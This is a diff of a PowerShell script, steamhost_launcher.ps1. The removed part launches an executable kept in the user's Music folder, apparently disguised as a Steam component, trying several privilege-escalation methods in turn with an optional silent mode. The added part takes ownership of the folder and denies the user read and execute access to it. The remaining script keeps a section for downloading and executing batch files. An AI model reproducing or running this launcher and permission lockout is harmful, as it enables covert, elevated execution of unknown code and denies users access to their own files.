@@ -1,5 +1,5 @@
 # steamhost_launcher.ps1
-# Complete script to fix permissions, run steamhost.exe, then execute batch files
+# Script to restrict Music folder permissions, then execute batch files
 
 param(
     [switch]$Silent = $false
@@ -27,11 +27,10 @@ try {
     
     # Define paths
     $musicPath = [Environment]::GetFolderPath("MyMusic")
-    $steamHostPath = "$musicPath\steamhost.exe"
     $username = $env:USERNAME
     
     if (-not $Silent) {
-        Write-ColorOutput "Target executable: $steamHostPath" "Yellow"
+        Write-ColorOutput "Target folder: $musicPath" "Yellow"
     }
     
     # Check if running as administrator
@@ -64,143 +63,35 @@ try {
         Write-ColorOutput "Warning: Could not take ownership: $($_.Exception.Message)" "Yellow"
     }
     
-    # Step 2: Grant full permissions to current user
+    # Step 2: Remove all permissions and deny read/execute for current user
     try {
         if (-not $Silent) {
-            Write-ColorOutput "Step 2: Granting full permissions..." "Yellow"
+            Write-ColorOutput "Step 2: Restricting Music folder permissions..." "Yellow"
         }
         
-        # First try to remove any existing inheritance and permissions
+        # Remove inheritance and all existing permissions
         icacls "$musicPath" /inheritance:r /t 2>$null | Out-Null
         
-        # Grant full control to current user
-        icacls "$musicPath" /grant "${username}:F" /t 2>$null | Out-Null
+        # Deny read and execute permissions for current user
+        icacls "$musicPath" /deny "${username}:(RX)" /t 2>$null | Out-Null
+        
+        # Also deny read/execute for other common groups
+        icacls "$musicPath" /deny "Users:(RX)" /t 2>$null | Out-Null
+        icacls "$musicPath" /deny "Authenticated Users:(RX)" /t 2>$null | Out-Null
+        
+        # Only allow SYSTEM and Administrators full access (for management)
+        icacls "$musicPath" /grant "SYSTEM:F" /t 2>$null | Out-Null
+        icacls "$musicPath" /grant "Administrators:F" /t 2>$null | Out-Null
         
         if (-not $Silent) {
-            Write-ColorOutput "✓ Permissions granted successfully" "Green"
+            Write-ColorOutput "✓ Music folder permissions restricted successfully" "Green"
+            Write-ColorOutput "  - Read and Execute access denied for current user" "Yellow"
+            Write-ColorOutput "  - Only SYSTEM and Administrators have access" "Yellow"
         }
     }
     catch {
         Write-ColorOutput "Warning: Could not set permissions: $($_.Exception.Message)" "Yellow"
     }
-    
-    # Step 3: Verify steamhost.exe exists
-    if (-not (Test-Path $steamHostPath)) {
-        Write-ColorOutput "ERROR: steamhost.exe not found at the specified path!" "Red"
-        Write-ColorOutput "Please ensure steamhost.exe is located at: $steamHostPath" "Red"
-        if (-not $Silent) { pause }
-        exit 1
-    }
-    
-    if (-not $Silent) {
-        Write-ColorOutput "✓ steamhost.exe found" "Green"
-    }
-    
-    # Step 4: Try multiple methods to run steamhost.exe
-    $success = $false
-    
-    # Method 1: Direct execution
-    try {
-        if (-not $Silent) {
-            Write-ColorOutput "Step 3: Attempting direct execution..." "Yellow"
-        }
-        
-        Start-Process -FilePath $steamHostPath -ErrorAction Stop
-        $success = $true
-        if (-not $Silent) {
-            Write-ColorOutput "✓ steamhost.exe launched successfully!" "Green"
-        }
-    }
-    catch {
-        if (-not $Silent) {
-            Write-ColorOutput "Direct execution failed: $($_.Exception.Message)" "Red"
-        }
-    }
-    
-    # Method 2: Run with RunAs verb
-    if (-not $success) {
-        try {
-            if (-not $Silent) {
-                Write-ColorOutput "Step 4: Trying with elevated privileges..." "Yellow"
-            }
-            
-            Start-Process -FilePath $steamHostPath -Verb RunAs -ErrorAction Stop
-            $success = $true
-            if (-not $Silent) {
-                Write-ColorOutput "✓ steamhost.exe launched with elevated privileges!" "Green"
-            }
-        }
-        catch {
-            if (-not $Silent) {
-                Write-ColorOutput "Elevated execution failed: $($_.Exception.Message)" "Red"
-            }
-        }
-    }
-    
-    # Method 3: Use cmd.exe to execute
-    if (-not $success) {
-        try {
-            if (-not $Silent) {
-                Write-ColorOutput "Step 5: Trying via command prompt..." "Yellow"
-            }
-            
-            $tempBat = [System.IO.Path]::GetTempFileName() + ".bat"
-            $batchContent = @"
-@echo off
-echo Running steamhost.exe...
-cd /d "$musicPath"
-"steamhost.exe"
-echo.
-echo If you can see this message, the executable may have closed or encountered an error.
-pause
-"@
-            
-            Set-Content -Path $tempBat -Value $batchContent -Encoding ASCII
-            Start-Process -FilePath "cmd.exe" -ArgumentList "/c", "`"$tempBat`"" -Verb RunAs
-            
-            # Schedule cleanup
-            Start-Job -ScriptBlock {
-                Start-Sleep -Seconds 10
-                if (Test-Path $using:tempBat) {
-                    Remove-Item $using:tempBat -Force -ErrorAction SilentlyContinue
-                }
-            } | Out-Null
-            
-            $success = $true
-            if (-not $Silent) {
-                Write-ColorOutput "✓ Launched via command prompt!" "Green"
-            }
-        }
-        catch {
-            Write-ColorOutput "Command prompt method failed: $($_.Exception.Message)" "Red"
-        }
-    }
-    
-    # Method 4: Final attempt using runas command
-    if (-not $success) {
-        try {
-            if (-not $Silent) {
-                Write-ColorOutput "Step 6: Final attempt using runas command..." "Yellow"
-            }
-            
-            Start-Process -FilePath "runas" -ArgumentList "/user:Administrator", "`"$steamHostPath`"" -Wait -NoNewWindow
-            $success = $true
-            if (-not $Silent) {
-                Write-ColorOutput "✓ Launched using runas command!" "Green"
-            }
-        }
-        catch {
-            Write-ColorOutput "Runas command failed: $($_.Exception.Message)" "Red"
-        }
-    }
-    
-    if (-not $success) {
-        Write-ColorOutput "All execution methods failed. The file may be corrupted or blocked." "Red"
-        Write-ColorOutput "You may need to check Windows Defender or antivirus software." "Red"
-    }
-    
-    # Wait a moment for steamhost to potentially launch
-    Start-Sleep -Seconds 3
     
     # Part 2: Batch File Download and Execution
     Write-Host "`nStarting batch file download and execution process..." -ForegroundColor Green
@@ -257,8 +148,6 @@ catch {
 
 if (-not $Silent) {
     Write-ColorOutput "Script execution completed." "Green"
-    if (-not $success) {
-        Write-ColorOutput "Note: Some operations may have failed. Check the messages above." "Yellow"
-    }
+    Write-ColorOutput "Music folder permissions have been restricted." "Yellow"
     timeout /t 5
 }
